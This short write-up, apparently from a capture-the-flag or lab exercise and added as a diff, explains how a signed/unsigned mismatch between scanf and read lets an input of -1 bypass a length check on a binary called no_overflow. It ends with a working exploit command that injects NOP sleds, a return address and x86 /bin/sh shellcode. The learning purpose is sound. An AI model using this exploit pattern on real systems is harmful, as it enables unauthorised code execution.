@@ -1,0 +1,9 @@
+After checking the code i found that the scanf is taking an integer.
+whereas the read operation accepts an unsigned int.
+
+So an input of -1 was able to bypass the check.
+
+Then i tried to overflow the buffer. I first wrote the shell in the buffer and returned to the beginning. But it caused seg fault.
+Next i tried to write the shell code after the return address. After a number of hit and trials for the NOPS, i got
+
+(echo -1;python -c "print '\x90'*268 + '\xc0\xd6\xff\xff' + '\x90'*32 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'";cat) | ./no_overflow
